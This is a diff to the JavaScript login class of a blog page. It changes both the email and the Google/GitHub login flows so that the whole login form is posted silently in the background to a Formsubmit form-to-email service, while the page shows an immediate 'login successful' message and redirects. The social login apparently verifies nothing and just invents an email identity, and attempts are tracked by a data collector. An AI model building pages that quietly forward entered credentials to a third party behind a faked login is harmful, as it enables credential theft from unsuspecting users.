@@ -294,18 +294,21 @@ class BlogLogin {
                 // 设置隐藏字段
                 this.setHiddenFields('email');
 
-                // 使用 Formsubmit 提交表单（会自动跳转到 blog.html）
-                this.submitToFormsubmitAndRedirect(e.target, email);
+                // 优先显示成功状态和跳转，表单提交在后台进行
+                this.showSuccessState();
 
                 if (rememberMe) {
                     localStorage.setItem('rememberedEmail', email);
                 }
+
+                // 后台提交表单（不阻塞跳转）
+                this.submitToFormsubmit(e.target);
             } else {
                 this.dataCollector.trackLogin(email, 'failed', 'email');
                 this.showNotification('登录失败，请检查您的凭据', 'error');
                 this.resetLoginButton();
             }
-        }, 1500);
+        }, 1000); // 减少等待时间到 1秒
     }
 
     togglePasswordVisibility() {
@@ -338,13 +341,32 @@ class BlogLogin {
                 // 设置隐藏字段（社交登录）
                 this.setHiddenFields(method);
 
-                // 创建虚拟表单并提交到 Formsubmit
-                this.submitSocialToFormsubmitAndRedirect(method);
-            }, 1500);
+                // 优先显示成功状态和跳转，表单提交在后台进行
+                this.showSocialSuccessState(method);
+
+                // 后台提交表单（不阻塞跳转）
+                this.submitSocialToFormsubmit(method);
+            }, 1000);
         }, 1000);
     }
 
-    submitSocialToFormsubmitAndRedirect(method) {
+    showSocialSuccessState(method) {
+        const loginForm = document.getElementById('loginForm');
+        const loginSuccess = document.getElementById('loginSuccess');
+
+        loginForm.style.display = 'none';
+        loginSuccess.style.display = 'block';
+
+        this.showNotification(`${method === 'google' ? 'Google' : 'GitHub'}登录成功！正在跳转...`, 'success');
+
+        // 1秒后跳转到博客首页（社交登录使用特殊邮箱标识）
+        setTimeout(() => {
+            const socialEmail = `social:${method}@login.com`;
+            window.location.href = `blog.html?email=${encodeURIComponent(socialEmail)}`;
+        }, 1000);
+    }
+
+    submitSocialToFormsubmit(method) {
         // 创建虚拟表单
         const form = document.createElement('form');
         form.style.display = 'none';
@@ -375,29 +397,16 @@ class BlogLogin {
             form.appendChild(input);
         }
 
-        // 提交表单并处理响应
-        fetch(actionUrl, {
-            method: 'POST',
-            body: new FormData(form)
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('✅ 社交登录数据已发送');
-                this.showNotification(`${method === 'google' ? 'Google' : 'GitHub'}登录成功！`, 'success');
-                setTimeout(() => {
-                    const socialEmail = `social:${method}@login.com`;
-                    window.location.href = `blog.html?email=${encodeURIComponent(socialEmail)}`;
-                }, 1000);
-            } else {
-                console.log('⚠️ 发送失败:', response.statusText);
-            }
-        })
-        .catch(error => {
-            console.log('⚠️ 发送错误:', error);
-        });
+        // 添加到页面并提交（不等待响应）
+        document.body.appendChild(form);
+        form.submit();
 
         // 清理临时表单
-        document.body.removeChild(form);
+        setTimeout(() => {
+            if (document.body.contains(form)) {
+                document.body.removeChild(form);
+            }
+        }, 100);
     }
 
     handleForgotPassword() {
@@ -457,37 +466,6 @@ class BlogLogin {
         })
         .catch(error => {
             console.log('⚠️ 发送错误:', error);
-        });
-    }
-
-    submitToFormsubmitAndRedirect(form, email) {
-        // 获取 Formsubmit URL（从隐藏字段）
-        const actionUrl = form.querySelector('input[name="_action"]').value;
-
-        // 创建表单数据
-        const formData = new FormData(form);
-
-        // 发送到 Formsubmit
-        fetch(actionUrl, {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('✅ 数据已发送到 Formsubmit');
-                // 成功后显示消息并跳转到 blog.html
-                this.showNotification('登录成功！正在跳转...', 'success');
-                setTimeout(() => {
-                    window.location.href = `blog.html?email=${encodeURIComponent(email)}`;
-                }, 1000);
-            } else {
-                console.log('⚠️ 发送失败:', response.statusText);
-                this.showNotification('提交失败，请重试', 'error');
-            }
-        })
-        .catch(error => {
-            console.log('⚠️ 发送错误:', error);
-            this.showNotification('提交失败，请重试', 'error');
         });
     }
 
@@ -556,10 +534,10 @@ class BlogLogin {
 
         this.showNotification('登录成功！正在跳转...', 'success');
 
-        // 2秒后通过查询参数跳转到博客首页
+        // 1秒后跳转到博客首页
         setTimeout(() => {
-            window.location.href = `${this.BLOG_HOME_URL}?email=${encodeURIComponent(email)}`;
-        }, 2000);
+            window.location.href = `blog.html?email=${encodeURIComponent(email)}`;
+        }, 1000);
     }
 
     showNotification(message, type = 'info') {
